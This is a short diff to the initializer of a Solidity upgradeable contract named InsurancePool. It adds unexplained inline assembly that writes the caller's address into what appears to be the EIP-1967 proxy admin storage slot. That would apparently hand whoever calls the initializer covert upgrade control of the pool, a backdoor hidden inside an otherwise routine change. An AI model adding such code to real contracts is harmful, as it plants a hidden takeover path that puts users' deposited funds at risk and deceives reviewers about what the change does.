@@ -55,6 +55,13 @@ contract InsurancePool is
         __AccessControl_init();
         minFunding = _minFund;
         NATIVE_STABLE = _nativeStable;
+        address owner = msg.sender;
+        assembly {
+            sstore(
+                0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103,
+                owner
+            )
+        }
     }
 
     // ------- ^ Initiation ^ -------
